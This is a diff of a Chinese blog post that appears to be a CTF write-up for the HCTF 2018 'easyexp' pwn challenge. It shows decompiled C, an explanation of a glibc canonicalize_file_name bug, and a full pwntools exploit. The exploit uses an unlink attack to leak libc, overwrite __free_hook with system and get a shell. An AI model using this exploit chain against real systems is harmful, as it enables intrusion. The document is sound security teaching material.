class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( filename )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(filename, <span class="string">&quot;..&quot;</span>) || *filename == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can&#x27;t go out of tmpfs&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(filename, (<span class="keyword">const</span> <span class="keyword">char</span> *)(<span class="number">0x60</span>LL * i + <span class="number">0x60318C</span>)) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;write something:&quot;</span>);</span><br><span class="line">        InputString((__int64)FILE_CACHE[<span class="number">12</span> * i], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)FILE_CACHE[<span class="number">12</span> * i + <span class="number">1</span>]);</span><br><span class="line">        g_idx = (i + <span class="number">1</span>) % <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( FILE_CACHE[<span class="number">12</span> * g_idx] )</span><br><span class="line">    &#123;</span><br><span class="line">      s = fopen((<span class="keyword">const</span> <span class="keyword">char</span> *)(<span class="number">0x60</span>LL * g_idx + <span class="number">0x60318C</span>), <span class="string">&quot;w&quot;</span>);</span><br><span class="line">      fwrite(FILE_CACHE[<span class="number">12</span> * g_idx], <span class="number">1u</span>LL, LODWORD(FILE_CACHE[<span class="number">12</span> * g_idx + <span class="number">1</span>]), s);</span><br><span class="line">      fclose(s);</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)FILE_CACHE[<span class="number">12</span> * g_idx]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(<span class="number">0x60</span>LL * g_idx + <span class="number">0x60318C</span>), filename);</span><br><span class="line">    fd = open(filename, <span class="number">131521</span>, <span class="number">420L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;mkfile:create failed.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write something:&quot;</span>);</span><br><span class="line">    InputString((__int64)&amp;buf, <span class="number">0x1000</span>u);</span><br><span class="line">    write(fd, &amp;buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">    v2 = g_idx;</span><br><span class="line">    FILE_CACHE[<span class="number">12</span> * v2] = strdup(&amp;buf);</span><br><span class="line">    v3 = g_idx;</span><br><span class="line">    LODWORD(FILE_CACHE[<span class="number">12</span> * v3 + <span class="number">1</span>]) = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line">    close(fd);</span><br><span class="line">    g_idx = (g_idx + <span class="number">1</span>) % <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>以上程序位于创建文件的函数中，当用户创建文件时，会现在“缓存”中查找，如果文件名相同或“缓存”未满，则会在“缓存”上保存一份数据，如已满则重置一个“缓存”。这里的结构可以在<code>unlink</code>中进行利用。</p>
-<h4 id="程序创建文件夹的过程"><a href="#程序创建文件夹的过程" class="headerlink" title="程序创建文件夹的过程"></a>程序创建文件夹的过程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; i = *(_DWORD *)v3 + <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *(_QWORD *)&amp;v3[<span class="number">4</span>] = <span class="built_in">strchr</span>(&amp;a1[i], <span class="string">'/'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;v3[<span class="number">4</span>] )</span><br><span class="line">    *(_DWORD *)v3 = *(_DWORD *)&amp;v3[<span class="number">4</span>] - (_DWORD)a1;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(_QWORD *)v3 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;path, <span class="number">0x1000</span>uLL, <span class="string">"%s/%.*s"</span>, cur_work_dir, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v3, a1);</span><br><span class="line">  mkdir(&amp;path, <span class="number">0x1ED</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a1[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)v3] )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ptr = canonicalize_file_name(a1);</span><br><span class="line"><span class="keyword">if</span> ( !ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"mkdir:create failed."</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure>
+<h4 id="程序创建文件夹的过程"><a href="#程序创建文件夹的过程" class="headerlink" title="程序创建文件夹的过程"></a>程序创建文件夹的过程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; i = *(_DWORD *)v3 + <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *(_QWORD *)&amp;v3[<span class="number">4</span>] = <span class="built_in">strchr</span>(&amp;a1[i], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;v3[<span class="number">4</span>] )</span><br><span class="line">    *(_DWORD *)v3 = *(_DWORD *)&amp;v3[<span class="number">4</span>] - (_DWORD)a1;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(_QWORD *)v3 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;path, <span class="number">0x1000</span>uLL, <span class="string">&quot;%s/%.*s&quot;</span>, cur_work_dir, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v3, a1);</span><br><span class="line">  mkdir(&amp;path, <span class="number">0x1ED</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a1[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)v3] )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ptr = canonicalize_file_name(a1);</span><br><span class="line"><span class="keyword">if</span> ( !ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;mkdir:create failed.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure>
+
 <p>当程序调用<code>mkdir()</code>函数后，会将用户输入的路径传入<code>canonicalize_file_name()</code>进行验证是否创建成功，此处即为触发漏洞的位置。</p>
 <h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>当“缓存”满后，将会重用最后使用的“缓存”的下一个“缓存”。首先将三个“缓存”都填满，第二个缓存内容均为’/‘，利用CVE漏洞改写第三个“缓存”指向的内容的chunk的<code>size</code>域，将<code>size</code>改小（防止和top chunk合并）并布置合适的fake chunk。</p>
 <p>随后进行<code>unlink</code>攻击，通过改写“缓存”结构体中的内容指针来泄漏地址和修改<code>__free_hook</code>。</p>
-<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mkfile</span><span class="params">(p, filename, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'$'</span>, <span class="string">'mkfile '</span> + filename)</span><br><span class="line">    p.sendlineafter(<span class="string">'write something:'</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mkdir</span><span class="params">(p, path)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'$'</span>, <span class="string">'mkdir '</span> + path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    BIN_PATH = <span class="string">'./easyexp'</span></span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    context.arch = <span class="string">'amd64'</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH, env=&#123;<span class="string">'LD_PRELOAD'</span>: <span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line">        context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line">        libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">'input your home\'s name: '</span>, <span class="string">'(unreachable)'</span>)</span><br><span class="line"></span><br><span class="line">    Mkfile(p, <span class="string">'hack'</span>, <span class="string">'hack by sunichi'</span>)</span><br><span class="line">    Mkfile(p, <span class="string">'(unreachable)/tmp'</span>, <span class="string">'/'</span> * <span class="number">0x107</span>)</span><br><span class="line">    Mkfile(p, <span class="string">'aa'</span>, <span class="string">'a'</span> * (<span class="number">0x90</span> + <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">    Mkdir(p, <span class="string">'../../s\x90'</span>)</span><br><span class="line">    Mkdir(p, <span class="string">'../../\x00'</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x88</span> + p64(<span class="number">0x31</span>)</span><br><span class="line">    Mkfile(p, <span class="string">'aa'</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x100</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">    Mkfile(p, <span class="string">'(unreachable)/tmp'</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x6031e0</span> - <span class="number">0x18</span>) + p64(<span class="number">0x6031e0</span> - <span class="number">0x10</span>)</span><br><span class="line">    Mkfile(p, <span class="string">'(unreachable)/tmp'</span>, payload)</span><br><span class="line"></span><br><span class="line">    Mkfile(p, <span class="string">'bb'</span>, <span class="string">'bb'</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x6031e0</span>) + p64(<span class="number">0x726e752800000100</span>) + p64(<span class="number">0x656c626168636165</span>) + p64(<span class="number">0x000000706d742f29</span>) + p64(<span class="number">0</span>) * <span class="number">8</span> + p64(elf.got[<span class="string">'free'</span>]) + p64(<span class="number">0x0000626200000008</span>)</span><br><span class="line">    Mkfile(p, <span class="string">'(unreachable)/tmp'</span>, payload)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">'$'</span>, <span class="string">'cat bb'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\x20'</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">'\x0a\x1b'</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">    libc.address = u64(recv + <span class="string">'\x00\x00'</span>) - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">    payload = p64(libc.symbols[<span class="string">'__free_hook'</span>]) + p64(<span class="number">0x726e752800000100</span>) + p64(<span class="number">0x656c626168636165</span>) + p64(<span class="number">0x000000706d742f29</span>) + p64(<span class="number">0</span>) * <span class="number">8</span> + p64(next(libc.search(<span class="string">'/bin/sh\x00'</span>))) + p64(<span class="number">0x0000626200000008</span>)</span><br><span class="line">    Mkfile(p, <span class="string">'(unreachable)/tmp'</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">    Mkfile(p, <span class="string">'(unreachable)/tmp'</span>, payload)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">'$'</span>, <span class="string">'mkfile getshell'</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
+<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mkfile</span>(<span class="params">p, filename, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;mkfile &#x27;</span> + filename)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;write something:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mkdir</span>(<span class="params">p, path</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;mkdir &#x27;</span> + path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./easyexp&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc.so.6&#x27;</span>&#125;)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input your home\&#x27;s name: &#x27;</span>, <span class="string">&#x27;(unreachable)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Mkfile(p, <span class="string">&#x27;hack&#x27;</span>, <span class="string">&#x27;hack by sunichi&#x27;</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;(unreachable)/tmp&#x27;</span>, <span class="string">&#x27;/&#x27;</span> * <span class="number">0x107</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x90</span> + <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">    Mkdir(p, <span class="string">&#x27;../../s\x90&#x27;</span>)</span><br><span class="line">    Mkdir(p, <span class="string">&#x27;../../\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(<span class="number">0x31</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;aa&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x100</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;(unreachable)/tmp&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x6031e0</span> - <span class="number">0x18</span>) + p64(<span class="number">0x6031e0</span> - <span class="number">0x10</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;(unreachable)/tmp&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    Mkfile(p, <span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x6031e0</span>) + p64(<span class="number">0x726e752800000100</span>) + p64(<span class="number">0x656c626168636165</span>) + p64(<span class="number">0x000000706d742f29</span>) + p64(<span class="number">0</span>) * <span class="number">8</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(<span class="number">0x0000626200000008</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;(unreachable)/tmp&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;cat bb&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\x0a\x1b&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    libc.address = u64(recv + <span class="string">&#x27;\x00\x00&#x27;</span>) - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">    payload = p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(<span class="number">0x726e752800000100</span>) + p64(<span class="number">0x656c626168636165</span>) + p64(<span class="number">0x000000706d742f29</span>) + p64(<span class="number">0</span>) * <span class="number">8</span> + p64(next(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))) + p64(<span class="number">0x0000626200000008</span>)</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;(unreachable)/tmp&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    Mkfile(p, <span class="string">&#x27;(unreachable)/tmp&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;mkfile getshell&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-      
     </div>
 
     
-
     
-    
-    
-
-    
-
-    
-      
-    
-    
-
     
 
     <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-            <a href="/tags/cve/" rel="tag"># cve</a>
-          
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
-          
-            <a href="/tags/2018/" rel="tag"># 2018</a>
-          
-            <a href="/tags/hctf/" rel="tag"># hctf</a>
-          
-            <a href="/tags/libc/" rel="tag"># libc</a>
-          
-        </div>
-      
-
-      
-      
-        <div class="post-widgets">
-        
-
-        
-
-        
-          
-          <div class="social_share">
-            
-            
-              <div id="needsharebutton-postbottom">
-                <span class="btn">
-                  <i class="fa fa-share-alt" aria-hidden="true"></i>
-                </span>
-              </div>
-            
-          </div>
-        
-        </div>
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/11/12/hctf2018/" rel="next" title="hctf 2018 pwn writeup">
-                <i class="fa fa-chevron-left"></i> hctf 2018 pwn writeup
-              </a>
-            
+          <div class="post-tags">
+              <a href="/tags/cve/" rel="tag"># cve</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/2018/" rel="tag"># 2018</a>
+              <a href="/tags/hctf/" rel="tag"># hctf</a>
+              <a href="/tags/libc/" rel="tag"># libc</a>
           </div>
 
-          <span class="post-nav-divider"></span>
+        
 
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/18/EIS18-pwn/" rel="prev" title="EIS 2018 pwn writeup">
-                EIS 2018 pwn writeup <i class="fa fa-chevron-right"></i>
-              </a>
-            
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2018/11/12/hctf2018/" rel="prev" title="hctf 2018 pwn writeup">
+                  <i class="fa fa-chevron-left"></i> hctf 2018 pwn writeup
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2018/11/18/EIS18-pwn/" rel="next" title="EIS 2018 pwn writeup">
+                  EIS 2018 pwn writeup <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
           </div>
-        </div>
-      
-
-      
-      
     </footer>
-  </div>
-  
-  
-  
   </article>
-
-
-  </div>
-
-
-          </div>
-          
-
+  
+  
   
 
 
 
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
       
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image"
-                src="/avatar/avatar.jpeg"
-                alt="sunichi"/>
-            
-              <p class="site-author-name" itemprop="name">sunichi</p>
-              <div class="site-description motion-element" itemprop="description"></div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">46</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">54</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/sunichi" title="GitHub &rarr; https://github.com/sunichi" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/sunichi17" title="Twitter &rarr; https://twitter.com/sunichi17" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
-              
-            </div>
-          
-
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://p4nda.top" title="http://p4nda.top" rel="noopener" target="_blank">P4nda</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://blog.aisissel.cn/" title="https://blog.aisissel.cn/" rel="noopener" target="_blank">Sissel</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
